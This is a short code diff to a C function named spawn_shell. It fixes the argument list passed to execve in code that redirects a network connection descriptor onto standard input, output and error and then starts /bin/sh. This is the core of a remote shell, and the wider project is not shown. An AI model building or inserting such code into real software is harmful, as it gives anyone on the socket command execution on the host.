@@ -53,7 +53,7 @@ void spawn_shell(int confd, int sockfd)
 		dup2(confd, 0);
 		dup2(confd, 1);
 		dup2(confd, 2);
-		execve("/bin/sh", NULL, NULL);
+		execve("/bin/sh", (char *[]){"sh", NULL}, NULL);
 		exit(EXIT_FAILURE);
 	}
 }
